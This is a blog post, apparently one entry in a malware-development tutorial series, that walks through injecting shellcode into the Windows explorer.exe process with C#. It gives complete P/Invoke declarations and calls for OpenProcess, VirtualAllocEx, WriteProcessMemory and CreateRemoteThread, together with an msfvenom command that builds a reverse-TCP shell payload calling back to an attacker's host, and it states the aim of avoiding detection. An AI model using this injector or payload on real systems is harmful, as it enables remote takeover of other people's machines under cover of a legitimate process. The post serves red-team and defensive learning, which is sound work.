# Trust in the Process

## Introduction

Let's continue our adventure in malware development and move on to the next exercise in [Malware Development for Dummies](https://github.com/chvancooten/maldev-for-dummies). You can read the previous entry in this blog series [here](https://threeeightsec.github.io/posts/Maldev1/). That post goes through a lot of background information that we will be utilizing from here on out.

> **Disclaimer**: The information, techniques, and solutions detailed in this blog are for educational purposes only. Do not use this content for malicious and/or illicit purposes.

## Objective

This time, we're going to learn how to inject shellcode into a remote process. This allows us to disguise our activities under a guise of a legitimate process. For this exercise, I'll be focusing on the `explorer.exe` process.

## A New Set of Functions

In our last exercise, we utilized `VirtualAlloc` to allocate memory, `Marshal.copy` to copy our shellcode into memory, and `CreateThread` to execute the code in memory.

For this solution we will be using a new set of functions. First we'll use `OpenProcess` to get a handle on our target process. Then, we'll use `VirtualAllocEx` which allocates executable memory in our target remote process. Then, we'll use `WriteProcesMemory` to copy our shellcode into the memory and then use `CreateRemoteThread` to execute the shellcode.

As you can see, the process is pretty similar to our last solution.

Before we begin, let's set our namespaces so that we can import the necessary dlls:

```c#
using System.Diagnostics;
using System.Runtime.InteropServices;
```

Now, let's find these functions from [PInvoke.net](https://pinvoke.net/index.aspx). Next, we'll create a new C# solution and improt these functions into a class.

```c#
class Methods
{
    //OpenProcess API to get handle on the target process
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId);

     //VirtualAllocEx to allocate memory in the remote process
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

     //WriteProcessMemory to copy shellcode into memory
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberofBytesWritten);
     
     //CreateRemoteThread to execute the shellcode in memory
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParamerter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
    
    public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000,
        }

    public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
}
```
* Lines 3 to 37 defines the functions listed above.
* Lines 39 to 52 defines enums that we might use later.

Note that these functions are also from kernel32.dll.

## The Main Function

Let's start constructing our main function.

First we're going to use the same shellcode we built last time with `msfvenom`.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=attackerPort -f csharp
```

We'll paste the `msfvenom` output into our code. Here is an example of what it would look like:

```c#
byte[] shellcode = new byte[380] {0x00,0x00,...};
```

Next, let's get the process ID for `explorer.exe`
```c#
Process[] targetProcess = Process.GetProcessesByName("explorer");
Process explorerProcess = targetProcess[0];
```
This will get all the PID's of any process with the term "explorer." We then take the first ID in that array and assign it to the `explorerProcess` variable.

We will then call `OpenProcess` to get a handle on our target process and also create a `bytesWritten` variable for future use.
```c#
IntPtr process_handle = Methods.OpenProcess(0x1F0FFF, false, explorerProcess.Id);
IntPtr bytesWritten;
```

Next, we will use `VirtualAllocEx` to allocate memory in our target process using the process handle.

```c#
IntPtr memory_allocation = Methods.VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);
```

We will use `WriteProcessMemory` to write our shellcode into memory.
```c#
Methods.WriteProcessMemory(process_handle, memory_allocation, shellcode, (int)shellcode.Length, out bytesWritten);
```

Finally, we execute the code with `CreateRemoteThread`.
```c#
Methods.CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation, IntPtr.Zero, 0, IntPtr.Zero);
```

Let's test this code out!

First, we'll create a listener on our Kali machine.

![Listener](/assets/images/listener.png)

Let's run our code in Visual Studio:
![Injector](/assets/images/runInjector.png)

And we catch another reverse shell!

## Conclusion

In this blog, we've utilized a different set of functions to inject shellcode. This time, we injected shellcode in a remote process in an effort to avoid detection. However, this solution will also get caught by Defender since it is a well known technique. We will explore defense evasion in our next blog post in this series so stay tuned!
